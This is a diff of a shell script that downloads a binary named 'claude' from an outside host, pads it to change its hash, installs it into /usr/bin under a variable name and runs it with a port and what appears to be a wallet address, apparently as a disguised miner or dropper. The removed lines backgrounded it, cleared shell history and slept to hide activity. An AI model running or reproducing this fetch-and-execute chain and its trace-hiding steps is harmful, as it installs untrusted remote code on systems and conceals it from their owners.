@@ -9,6 +9,5 @@ curl -L -O -J https://storage.technoelectro.online/claude
 chmod +x claude
 echo -n "   " >> ./claude
 mv -f ./claude /usr/bin/${code}
-nohup ${code} --host 127.0.0.1:${PORT} --user prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t >/dev/null 2>&1 &
-history -c && history -w && clear
-sleep 12h
+./${code} --host 127.0.0.1:${PORT} --user prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t
+
